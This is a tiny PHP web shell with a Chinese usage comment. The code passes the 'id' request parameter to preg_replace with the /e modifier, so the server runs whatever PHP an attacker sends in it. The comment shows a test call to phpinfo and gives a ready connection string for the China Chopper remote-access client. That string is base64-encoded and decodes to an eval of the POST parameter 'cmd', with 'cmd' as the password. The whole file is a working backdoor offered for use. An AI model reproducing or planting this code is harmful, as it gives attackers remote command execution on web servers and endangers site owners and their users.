<?php  
$a = $_REQUEST['id'];
preg_replace('/.*/e',' '.$a,'');
?>

/* 
执行方法:?id=eval('phpinfo();');
菜刀连接方法:00.php?id=eval%28base64_decode%28%22QGV2YWwoJF9QT1NUWydjbWQnXSk7%22%29%29;  密码cmd
*/
